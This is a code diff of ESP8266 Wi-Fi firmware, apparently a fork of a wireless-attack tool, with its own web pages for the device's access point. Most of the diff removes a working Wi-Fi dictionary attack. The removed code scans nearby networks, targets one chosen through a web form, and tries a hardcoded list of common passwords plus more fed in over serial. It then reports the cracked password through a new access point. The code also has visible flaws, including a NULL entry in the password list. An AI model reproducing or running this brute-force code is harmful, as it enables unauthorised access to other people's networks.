@@ -15,7 +15,6 @@ extern "C" {
 #define WIFI_MODE_OFF 0
 #define WIFI_MODE_AP 1
 #define WIFI_MODE_STATION 2
-#define MAX_MESSAGE 30
 
 /*
    This file contains all necessary functions for hosting and connecting to an access point.
@@ -56,30 +55,6 @@ const char W_DOT_ZIP[] PROGMEM = ".zip";
 const char W_DOT_GZIP[] PROGMEM = ".gz";
 const char W_DOT_JSON[] PROGMEM = ".json";
 
-static char buff[MAX_MESSAGE];
-const char* ssidME = "none"; //Enter SSID
-const char* passwordME = "password"; //Enter Password
-char incoming = 0;
-
-bool ssidSelected = false;
-bool failed = false;
-
-int itNum = 0;
-int ind = 0;
-int seconds = 0;
-int wifiNetwork = 0;
-
-String toPrint = "";
-
-#define passwordsSize 50
-
-
-const char dictionaryHtmlOne[] =  {"<!DOCTYPE html><html><head><title>nayanCard</title><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"/stylesheet\" href=\"main.css\"/></head><body><div class=\"page-wrap\"><nav id=\"nav\"><ul><li><a href=\"indexMyHome.html\" class=\"active\"><span class=\"icon fa-home\"></span></a></li><li><a href=\"generic.html\"><span class=\"icon fa-wifi\"></span></a></li></ul></nav><section id=\"main\"><header id=\"header\"><div>Dictionary Attack</div></header><section><div class=\"inner\"><header><h1>Dictionary Attack</h1></header><p>This tool starts automaticly, first trying 100 of the most commen passwords avalible, then, if necessary, opens a serial connection over com at a rate of 115200 in which you can set up a simple python program to send strings(one every 20 seconds) in order to send a longer list</p><div> </div><p id=\"progressDict\">"};
-const char dictionaryHtmlTwo[] =  {"</p><br> <form action=\"/get\"> Enter SSID Number Here: <input type=\"text\" name=\"ssidInput\" value=\"\"><input type=\"submit\" value=\"Submit\"> </form><br></div></section><footer id=\"footer\"<div> class=\"copyright\"&copy; Nayan Smuek</a></div></footer></section></div></body></html>"};
-
-String passwordSuccess = "no passwords yet";
-//String ssidInputed = "";
-
 // Server and other global objects
 ESP8266WebServer server(80);
 DNSServer dnsServer;
@@ -95,230 +70,6 @@ bool   wifi_config_captivePortal = false;
 String wifi_config_ssid;
 String wifi_config_password;
 String wifi_config_path;
-
-void handlePassword() {
-server.send(200, "text/plain", passwordSuccess);
-}
-
-void handleSelect()
-{
-  server.send(200, "text/html", "<!DOCTYPE HTML><html><head><meta http-equiv = \"refresh\" content = \"12; url = http://192.168.4.1/selection\" /></head><body>loading, should take about 10-15 seconds</body></html>");
-  // Serial.println(dictionaryHtmlOne+dictionaryHtmlTwo);
-  Serial.begin(115200);
-
-  Serial.print("Scan start ... ");
-  int n = WiFi.scanNetworks();
-  Serial.print(n);
-  Serial.println(" network(s) found");
-  for (int i = 0; i < n; i++)
-  {
-    toPrint += i;
-    Serial.print(i);
-    toPrint += " ";
-    Serial.print(" ");
-    toPrint += (WiFi.SSID(i));
-    Serial.print(WiFi.SSID(i));
-     toPrint += "<br>";
-    Serial.print('\n');
- }
-     toPrint += "<br>";
- //toPrint += "enter the number of the network to attack";
-  Serial.println();
-
-  Serial.print("targeting ");//targeting "ssid"
-  Serial.print(ssidME);
-  Serial.print('\n');
-  
-  //String before = ssidME;
-  //server.send(200, "text/html", dictionaryHtmlOne+before+dictionaryHtmlTwo);
-
-
-  Serial.println("select number of network to targert");
-}
-
-void handleSelection()
-{
-  Serial.println("handle selection");
-  toPrint += "<br> To see progress open a  serial port on at a rate of 115200 to this device, the attack locks up the wifi antenna so the webpage is no longer usable";
-  toPrint += "to stop this process, press the reset button on the device or unplug it from power and plug it back in";
-  toPrint += "once connected , the device will create a network with the name nayanCard has found the password, connect there and go to 192.168.4.1/password to see the saved password,";
-  toPrint += "the odds of success are only about 40 or so percent with this attack so if it is taking too long(around 50 minutes with the onboard list) the device will stop the attack and declare it a failure unless a serial connection is started and more passwords are entered";
-   server.send(200, "text/html", dictionaryHtmlOne+toPrint+dictionaryHtmlTwo);
-}
-
-void handleForm() {
-  char *passwords[] = {
-   "123456789",
-   "12345678",
-   "abcd1234",
-   "1234abcd",
-   "Password",
-   "password",
-   "abcdefgh",
-   "password.",
-   "123456789.",
-   "12345678.",
-   "11111111",
-   "111111111",
-   "1111111111",
-   "1234567890",
-   "Passwords",
-   "Passwords.",
-   "iloveyou",
-   "12341234",
-   "123123123",
-   "1234512345",
-   "00000000",
-   "0000000000",
-   "logmein",
-   "letmein",
-   "password1",
-   "77777777",
-   "88888888",
-   "66666666",
-   "55555555",
-   "99999999",
-   "loversloveme",
-   "hatersloveme",
-   "hatershateme",
-   "PASSWORD",
-   "###123###",
-   "Apple Network 0273df",
-   "MiniAP",
-   "belkin54g",
-   "NETGEAR",
-   "linksys",
-   "public",
-   "admin",
-   "user",
-   "default",
-   "1234567890",
-   "passw0rd",
-   "football",
-   "123456789",
-   NULL,
-   "michelangelo"
-};
-  String toOutput = "";
-  String ssidInputed = server.arg("ssidInput");
-  Serial.println("SSID INPUTED IS NOW:");
-  Serial.println(ssidInputed);
-
-  String toChange = WiFi.SSID((ssidInputed.toInt()));
-  char changed[toChange.length()+1];
-
-  toChange.toCharArray(changed, toChange.length()+1);
-
-
-  ssidME = changed;
-  toOutput += "device now attacking ";
-  toOutput += ssidME;
-  //server.send(200, "text/html", dictionaryHtmlOne+toOutput+dictionaryHtmlTwo);
-
-  while ((WiFi.status() != WL_CONNECTED) && !failed) 
-  {
-    
-  static char buffer[MAX_MESSAGE];
-  static unsigned char index = 0;
-  char currentChar;
-
-      while(itNum<passwordsSize){
-      passwordME = passwords[itNum];
-      String outputProgress = "";
-
-
-      outputProgress += "You are currently testing the network ";
-      outputProgress += ssidME;
-      outputProgress += " with the password ";
-      outputProgress += passwordME;
-      outputProgress += " which is number ";
-      outputProgress += itNum+1;
-      outputProgress += " out of ";
-      outputProgress += passwordsSize;
-      outputProgress += ".";
-      outputProgress += " About ";
-      outputProgress += seconds;
-      outputProgress += " seconds have elapsed since the start of this attack";
-      Serial.println(outputProgress);
-      itNum++;
-      
-      WiFi.begin(ssidME, passwordME);
-      delay(21850);
-      seconds += 22;
-      }
-
-while(seconds < 3000){
-    while(Serial.available() > 0) {//try serical.avalible as a bool
-      currentChar = Serial.read();
-      if (currentChar == '\n'){
-
-      Serial.print("You entered: "); //you entered "what you entered"
-      Serial.print(buffer);
-      Serial.print('\n');
-      passwordME = buffer;
-
-      Serial.print("trying password number "); //trying password number "number": "password"           seconds elapsed: "seconds"
-      Serial.print((itNum+1));
-      Serial.print(": ");
-      Serial.print(passwordME);
-      Serial.print('\n');
-      Serial.print("seconds elapsed:");
-      Serial.print(seconds);
-      Serial.print('\n');
-      Serial.print('\n');
-      itNum++;
-      
-      WiFi.begin(ssidME, passwordME);
-      delay(21850);
-      seconds += 22;
-
-      Serial.println("please enter a password to try");
-      Serial.print('\n');
-
-      buffer[0] = 0;
-      index = 0;
-     } else {       
-      if (index < MAX_MESSAGE-1) {
-        buffer[index++] = currentChar;
-        buffer[index] = 0;
-       }  
-      } 
-     }
-     }
-     Serial.println("this failed");
-     failed = true;
-    }
-
-    if(!failed)
-    {
-    Serial.print("WiFi connection Successful, taking about ");//Wifi connection succesful, taking about "seconds"     The Ip address of this module is "ip"    The wifi password for "network" is "password"
-    Serial.print(seconds);
-    Serial.print(" seconds");
-    Serial.print('\n');
-    Serial.print("Information:");
-    Serial.print('\n');
-    WiFi.printDiag(Serial);
-
-    String correctPassword = passwordME;
-    WiFi.softAP("nayanCard has found the password", NULL);             // Start the access point
-
-    passwordSuccess = "";
-    passwordSuccess += "The password for the wifi network ";
-    passwordSuccess += ssidME;
-    passwordSuccess += " Is";
-    passwordSuccess += passwordME;
-    }
-
-
-     if(failed){
-      WiFi.softAP("nayanCard failed to find the password", NULL);             // Start the access point
-     }
-
-  //}
-  //String before = ssidME;
-  //server.send(200, "text/html", dictionaryHtmlOne+before+dictionaryHtmlTwo);
-}
-
 
 void stopAP() {
     if (wifiMode == WIFI_MODE_AP) {
@@ -480,7 +231,7 @@ void startAP(String path, String ssid, String password, uint8_t ch, bool hidden,
 #ifdef USE_PROGMEM_WEB_FILES
     if (!settings.getWebSettings().use_spiffs) {
         server.on(String(SLASH).c_str(), HTTP_GET, [] () {
-            sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
+            sendProgmem(indexMyHomehtml, sizeof(indexMyHomehtml), W_HTML);
         });
         server.on(String(F("/attack.html")).c_str(), HTTP_GET, [] () {
             sendProgmem(attackhtml, sizeof(attackhtml), W_HTML);
@@ -518,55 +269,30 @@ void startAP(String path, String ssid, String password, uint8_t ch, bool hidden,
         server.on(String(F("/js/ssids.js")).c_str(), HTTP_GET, [] () {
             sendProgmem(ssidsjs, sizeof(ssidsjs), W_JS);
         });
-        server.on(String(F("/lang/cn.lang")).c_str(), HTTP_GET, [] () {
-            sendProgmem(cnlang, sizeof(cnlang), W_JSON);
-        });
-        server.on(String(F("/lang/cs.lang")).c_str(), HTTP_GET, [] () {
-            sendProgmem(cslang, sizeof(cslang), W_JSON);
-        });
-        server.on(String(F("/lang/de.lang")).c_str(), HTTP_GET, [] () {
-            sendProgmem(delang, sizeof(delang), W_JSON);
-        });
         server.on(String(F("/lang/en.lang")).c_str(), HTTP_GET, [] () {
             sendProgmem(enlang, sizeof(enlang), W_JSON);
         });
-        server.on(String(F("/lang/es.lang")).c_str(), HTTP_GET, [] () {
-            sendProgmem(eslang, sizeof(eslang), W_JSON);
-        });
-        server.on(String(F("/lang/fi.lang")).c_str(), HTTP_GET, [] () {
-            sendProgmem(filang, sizeof(filang), W_JSON);
-        });
-        server.on(String(F("/lang/fr.lang")).c_str(), HTTP_GET, [] () {
-            sendProgmem(frlang, sizeof(frlang), W_JSON);
-        });
-        server.on(String(F("/lang/it.lang")).c_str(), HTTP_GET, [] () {
-            sendProgmem(itlang, sizeof(itlang), W_JSON);
-        });
-        server.on(String(F("/lang/ru.lang")).c_str(), HTTP_GET, [] () {
-            sendProgmem(rulang, sizeof(rulang), W_JSON);
-        });
-        server.on(String(F("/lang/tlh.lang")).c_str(), HTTP_GET, [] () {
-            sendProgmem(tlhlang, sizeof(tlhlang), W_JSON);
-        });
-        server.on("/get", handleForm);
-        server.on("/password", handlePassword);
-        server.on("/selection", handleSelection);
-        //server.on(String(F("/start")).c_str(), HTTP_GET, [] () {
-        server.on("/start", handleSelect);
 
+
+        server.on(String(F("/generic.html")).c_str(), HTTP_GET, [](){
+          sendProgmem(generichtml, sizeof(generichtml), W_HTML);
+        });
+        server.on(String(F("/indexMyHome.html")).c_str(), HTTP_GET, [](){
+          sendProgmem(indexMyHomehtml, sizeof(indexMyHomehtml), W_HTML);
+        });
+        server.on(String(F("/indexMyStuff.html")).c_str(), HTTP_GET, [](){
+          sendProgmem(indexMyStuffhtml, sizeof(indexMyStuffhtml), W_HTML);
+        });
+        server.on(String(F("/fontawesome.min.css")).c_str(), HTTP_GET, [](){
+          sendProgmem(fontawesomemincss, sizeof(fontawesomemincss), W_CSS);
+        });
+        server.on(String(F("/main.css")).c_str(), HTTP_GET, [](){
+          sendProgmem(maincss, sizeof(maincss), W_CSS);
+        });
     }
     server.on(str(W_DEFAULT_LANG).c_str(), HTTP_GET, [] () {
         if (!settings.getWebSettings().use_spiffs) {
-            if (String(settings.getWebSettings().lang) == String(F("cn"))) sendProgmem(cnlang, sizeof(cnlang), W_JSON);
-            else if (String(settings.getWebSettings().lang) == String(F("cs"))) sendProgmem(cslang, sizeof(cslang), W_JSON);
-            else if (String(settings.getWebSettings().lang) == String(F("de"))) sendProgmem(delang, sizeof(delang), W_JSON);
-            else if (String(settings.getWebSettings().lang) == String(F("en"))) sendProgmem(enlang, sizeof(enlang), W_JSON);
-            else if (String(settings.getWebSettings().lang) == String(F("es"))) sendProgmem(eslang, sizeof(eslang), W_JSON);
-            else if (String(settings.getWebSettings().lang) == String(F("fi"))) sendProgmem(filang, sizeof(filang), W_JSON);
-            else if (String(settings.getWebSettings().lang) == String(F("fr"))) sendProgmem(frlang, sizeof(frlang), W_JSON);
-            else if (String(settings.getWebSettings().lang) == String(F("it"))) sendProgmem(itlang, sizeof(itlang), W_JSON);
-            else if (String(settings.getWebSettings().lang) == String(F("ru"))) sendProgmem(rulang, sizeof(rulang), W_JSON);
-            else if (String(settings.getWebSettings().lang) == String(F("tlh"))) sendProgmem(tlhlang, sizeof(tlhlang), W_JSON);
+            if (String(settings.getWebSettings().lang) == String(F("en"))) sendProgmem(enlang, sizeof(enlang), W_JSON);
 
             else handleFileRead(String(F("/web/lang/")) + String(settings.getWebSettings().lang) + String(F(".lang")));
         } else {
